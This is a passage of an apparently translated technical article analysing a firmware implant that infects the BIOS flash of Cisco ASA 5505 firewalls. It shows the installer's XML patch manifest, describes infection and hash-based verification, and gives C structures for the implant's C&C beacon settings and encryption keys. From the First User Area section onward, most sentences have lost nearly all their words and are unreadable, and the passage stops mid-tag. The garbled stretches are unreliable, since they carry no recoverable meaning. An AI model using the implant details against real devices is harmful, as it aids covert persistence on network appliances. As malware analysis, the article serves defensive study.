class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Sectors 4-5 --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span>d68c37d03242d4648b94d107bec27b1e3f3a248d<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff40000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span>0x20000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Sectors 8-F --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span>579d3ffa2fcb4d55a51b45747184a41656b88df2<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff80000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span>0x80000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signatureList</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">validationList</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-comment"><span class="hljs-comment">&lt;!-- SCP Signatures --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- CODE_AREA (aka SP Main) --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span>bb706c2b0d3e28ee5209eb0b4f55cc3b8adca81b<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff60000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span>0xdf00<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Sectors 4-5 --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span>d68c37d03242d4648b94d107bec27b1e3f3a248d<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff40000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span>0x20000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-comment"><span class="hljs-comment">&lt;!-- Sectors 8-F --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span>c4e5a42ddca3a977e6ba64075914d94a87ba1dfb<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">hash</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff80000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span>0x80000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">length</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">signature</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">validationList</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patchList</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-comment"><span class="hljs-comment">&lt;!-- Install SCP --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"inline"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"userarea"</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Assigned later --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff70000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- SECOND_USER_AREA_ADDRESS --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"file"</span></span></span><span class="hljs-tag">&gt;</span></span>bin/asa5505/SCP28/asa5505_patch60000.bin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff60000<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- FIRST_CODE_AREA_ADDRESS --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"inline"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pbd"</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- Assigned later --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fff6df00<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- FIRST_USER_AREA_ADDRESS --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"file"</span></span></span><span class="hljs-tag">&gt;</span></span>bin/asa5505/SCP28/asa5505_patchEC480.bin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fffec480<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- SECOND_CODE_AREA_ADDRESS --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"file"</span></span></span><span class="hljs-tag">&gt;</span></span>bin/asa5505/SCP28/asa5505_patchE18BF.bin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">data</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span>fffe18bf<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">address</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!-- HOOK_ADDRESS --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patch</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">patchList</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">version</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">platform</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  As you can see from the code, this xml file contains the <em>platform</em> root element, which describes the target ASA 5505 platform with <em>ROMMON</em> version 1.0 (12) 13 "on board", the original image of which is in the file <em>bin / asa5505 / asa5505_101213_bios_sectors1-E_clean.bin</em> .  For the BIOS of this platform, there are patches described in the <em>patchList</em> element.  Each of them has a destination address, and is divided into two types: a file on disk and a code (inline). </p><br><p>  The code of patches of the <em>inline</em> type, based on user data, is generated using the library for the <em>libasa.so</em> platform (see the <em>lib</em> attribute of the root element of the <em>platform</em> ), which is loaded by the <em>BPICKER</em> utility. </p><br><p>  At this stage, it is worth noting that in earlier versions of the utilities in <em>BannanaDaiquiri, the</em> formation of a BIOS Flash card took place directly in the infector itself, where the paths to the <em>file</em> type components were strictly spelled out. </p><br><h2>  Infection and subsequent verification </h2><br><p>  The entire infection process performed by the infector consists in the sequential sending of the configured patches to the engineering image.  To check the correctness of the effect produced, based on the contents of the <em>validationList</em> element, re-reading of the memory sections is performed followed by counting the hash sum of the read data.  While the elements in <em>signatureList</em> are used to ensure that the target system is not infected or the removal of the implant has been successfully completed. </p><br><p>  The picture below shows what BIOS flash looks like before and after infection. </p><br><p><img src="https://habrastorage.org/files/5ec/62e/266/5ec62e266da2452a8e729720fc55f052.png" alt="BIOS Flash ASA 5505 before and after infection"></p><br><h2>  Analysis of implant components </h2><br><p>  From the above contents <em>of the asa5505_101213_install_SCP28.pif xml file, it</em> can be seen that the implant itself consists of four main parts: <em>First Code Area, Second Code Area, First User Area, Second User Area</em> and some <em>Hook</em> 's: </p><br><p><img src="https://habrastorage.org/files/51b/8d1/c73/51b8d1c739ab47d39b333db22040c0f2.png" alt="Implant components"></p><br><p>  Further, for the sake of brevity, we will use the abbreviations <em>FCA, SCA, FUA</em> and <em>SUA</em> to denote the corresponding parts of the implant, and the <em>Hook</em> will probably remain <em>Hook</em> 'om. </p><br><p>  Now consider each of the components.  We will produce it in the reverse order to the one in which the implant uses them, which will simplify and, most importantly, do not break the chain of current events. </p><br><h3>  Second User Area (SUA @ 0xFFF70000) </h3><br><p>  This part is the main and only payload of the implant, while all the rest, in fact, are its loader.  <em>SUA</em> contains the implant payload code <strong>(A)</strong> , as well as some supporting information <strong>(B)</strong> describing the environment in which the payload code will work. </p><br><p>  The code of the payload is designed to establish communication with the command server (C &amp; C Server). </p><br><p>  Auxiliary information includes, for example: </p><br><ul><li>  instructions for determining the version of the main process; </li><li>  addresses of various functions in the address space of the main process that the payload code uses in its work (for example, functions for working with the network); </li><li>  offsets within the key structures of the main process, with which the payload code will work, etc. </li></ul><br><p>  Auxiliary information is stored in <em>SUA</em> as a complex of structures, the definition of which was obtained as a result of the analysis of the library <em>libasa.so</em> , and looks as follows: </p><br><pre> <code class="hljs cpp"><span class="hljs-comment"><span class="hljs-comment">/* User Area Directory */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> magic; <span class="hljs-comment"><span class="hljs-comment">/* UA_DIR signature is 0xD13EC703 */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> os8_off; <span class="hljs-comment"><span class="hljs-comment">/* OS8_INFO offset relative to UA_DIR start address */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> bg_gen_off; <span class="hljs-comment"><span class="hljs-comment">/* BG_GEN_INFO offset relative to UA_DIR start address */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> bg_os_off; <span class="hljs-comment"><span class="hljs-comment">/* BG_OS_INFO offset relative to UA_DIR start address */</span></span> } UA_DIR; <span class="hljs-comment"><span class="hljs-comment">/* ASA OS xxx Info */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> magic; <span class="hljs-comment"><span class="hljs-comment">/* OS8_INFO signature is 0xDECAFBAD */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> version; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> address; } records[<span class="hljs-number"><span class="hljs-number">0</span></span>]; } OS8_INFO; <span class="hljs-comment"><span class="hljs-comment">/* BANANAGLEE Gen? Info */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> magic; <span class="hljs-comment"><span class="hljs-comment">/* BG_GEN_INFO signature is 0xBA9A61EE*/</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> data_size; } header; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> unknown; <span class="hljs-comment"><span class="hljs-comment">/* observed to be zero */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> imp_version; <span class="hljs-comment"><span class="hljs-comment">/* implant version */</span></span> } BG_GEN_INFO; <span class="hljs-comment"><span class="hljs-comment">/* BANANAGLEE OS Info */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> magic; <span class="hljs-comment"><span class="hljs-comment">/* BG_OS_INFO signature is 0xBA9A61EE*/</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> size; <span class="hljs-comment"><span class="hljs-comment">/* BG_OS_INFO data size */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> page_size; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> version; <span class="hljs-comment"><span class="hljs-comment">/* lina/malina version this info is about */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> bg_glob_addr; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> malloc_addr; <span class="hljs-comment"><span class="hljs-comment">/* allocation routine address */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> sync_addr; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> checkheap_addr; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> imp_version; <span class="hljs-comment"><span class="hljs-comment">/* implant version major */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> unknown; <span class="hljs-comment"><span class="hljs-comment">/* maybe checksum */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">void</span></span>* addr_ptr_list[<span class="hljs-number"><span class="hljs-number">0</span></span>]; <span class="hljs-comment"><span class="hljs-comment">/* various information regarding the given version of the main process */</span></span> } BG_OS_INFO; <span class="hljs-comment"><span class="hljs-comment">/* will be stored as an array where each element describes one particular version */</span></span></code> </pre> <br><p>  Consider the purpose of individual structures: </p><br><ol><li>  <em>UA_DIR</em> is the root structure containing the offsets of the remaining structures relative to the beginning of the <em>SUA</em> . </li><li>  <em>OS8_INFO</em> is a structure containing addresses, in which the constants with the value of the version are located in the main process.  It should be noted that in this structure the addresses are located only for the main <em>lina</em> process (8.xx and above), since they differ from version to version (hence the name - <strong>OS8</strong> ).  The constant with the version of the main process <em>malina</em> (7.xx) is always located at <em>0x100040</em> . </li><li>  <em>BG_GEN_INFO</em> is a structure containing the size and version of the code of the implant's payload. </li><li>  <em>BG_OS_INFO</em> is a structure containing information describing a specific version of the main process. </li></ol><br><p>  The <em>UA_DIR, OS8_INFO, BG_GEN_INFO structures</em> are present in <em>SUA</em> single copy, and are located before the payload code.  The <em>BG_OS_INFO</em> structure, in turn, is present in <em>SUA</em> in multiple instances, one for each version of the main process.  A number of instances are stored as an array, located after the payload code. </p><br><p>  The formation of a complex of structures is carried out using a set of .dat files, each of which describes environments for a particular version of the main process (see the files <em>BANANAGLEE / BG3121 / Dats / *. Dat</em> ). </p><br><p>  The file <em>bin / BG_312_SCREAM_UA_full_support.bin is</em> used as a clean image of <em>SUA</em> and the further formation of its header. </p><br><h3>  First User Area (FUA @ 0xFFF6DF00) </h3><br><p>  ,    <em>PBD,</em>    <em>PBD Header</em> <strong>(A)</strong> ,    <em>userarea</em> <strong>(B)</strong> . </p><br><p>      <em>userarea</em> ,         <em>SUA</em>     <em>BG_OS_INFO</em> ,        .    <em>SUA</em>   BG_OS_INFO     ,       <em>userarea</em> .   ,        <em>SP Main</em>  . </p><br><p>      : </p><br><p><img src="https://habrastorage.org/files/25e/f8b/fad/25ef8bfad8f140a2a1a176297ef4246a.png" alt="The mechanism of the loader userarea"></p><br><p> ,  <em>SUA</em> ‚Äì        ,        <em>FUA</em>     ,   <em>userarea</em> . </p><br><p>   <em>PBD Header</em>   <em>FUA</em>   256 .   <em>PBD Header</em>  : </p><br><pre> <code class="hljs pgsql">struct PBD_Header { struct KEY { uint16_t CHECKS_CONSTANTS[<span class="hljs-number"><span class="hljs-number">10</span></span>]; // Constants <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> quick selection Beacon-packets uint8_t key1[<span class="hljs-number"><span class="hljs-number">8</span></span>]; // First part <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> RC6-key <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ecrypt Benign-packets <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-keyword"><span class="hljs-keyword">session</span></span> uint8_t key2[<span class="hljs-number"><span class="hljs-number">8</span></span>]; // Second part <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> RC6-key uint8_t challenge[<span class="hljs-number"><span class="hljs-number">16</span></span>]; uint8_t default_key1[<span class="hljs-number"><span class="hljs-number">8</span></span>]; // First part <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> RC6-key <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ecrypt HELLO, AUTH_RESP, CHALLENGE Benign-packets uint8_t default_key2[<span class="hljs-number"><span class="hljs-number">8</span></span>]; // Second part <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> RC6-key uint8_t CV[<span class="hljs-number"><span class="hljs-number">8</span></span>]; } key; uint32_t implantID; struct BEACON { uint32_t beacon_count; // Total number <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> beacons <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> send uint32_t primary_delay; // Seconds <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> delay first beacon uint32_t secondary_delay; // Seconds <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> delay subsequent beacons uint32_t min_delay; uint32_t max_delay; uint16_t min_src_port; // <span class="hljs-number"><span class="hljs-number">0x00</span></span> <span class="hljs-keyword"><span class="hljs-keyword">by</span></span> <span class="hljs-keyword"><span class="hljs-keyword">default</span></span> uint16_t max_src_port; // <span class="hljs-number"><span class="hljs-number">0xFFFF</span></span> <span class="hljs-keyword"><span class="hljs-keyword">by</span></span> <span class="hljs-keyword"><span class="hljs-keyword">default</span></span> uint32_t beacon_primary_IP; // First IP address <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> beacon destination uint32_t beacon_secondary_IP; // Second IP address <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> beacon destination <span class="hljs-type"><span class="hljs-type">char</span></span> domain_name[<span class="hljs-number"><span class="hljs-number">8</span></span>]; // DNS beacon <span class="hljs-keyword"><span class="hljs-keyword">domain</span></span> <span class="hljs-type"><span class="hljs-type">name</span></span> ("yahoo" <span class="hljs-keyword"><span class="hljs-keyword">by</span></span> <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>) } beacon; };</code> </pre> <br><p>  <em>PBD Header</em>        ,      C&amp;C (IP-,  ,  ""  ..).     <em>FUA</em> ,      ,   <em>bin/BG_312_PBD_config_CLEAN.bin</em> . </p><br><h3> First Code Area (FCA @ 0xFFF60000) </h3><br><p>       3 : </p><br><ul><li> A)     <em>mmap2</em> ,       . </li><li> B)  <em>SP Main</em> ,              <em>userarea</em> .       :   <em>userarea</em>  <em>FUA</em> , ,   ,        C&amp;C. </li><li> C)      C&amp;C ,   ,      .         . </li></ul><br><p>  <em>FCA</em>    <em>bin/asa5505/SCP28/asa5505_patch60000.bin</em> . </p><br><h3> Second Code Area (SCA @ 0xFFFEC480) </h3><br><p> <em>SCA</em>      <em>SMI</em> -,           .    ‚Äì  <em>FCA, FUA</em>   <em>SUA</em>            <em>SP Main</em>  <em>FCA</em> . </p><br><p>  <em>SCA</em>    <em>bin/asa5505/SCP28/asa5505_patchEC480.bin</em> . </p><br><h3> Hook (@ 0xFFFE18BF) </h3><br><p>      BIOS,     <em>SMI</em> -   <em>SMRAM</em> : </p><br><p><img 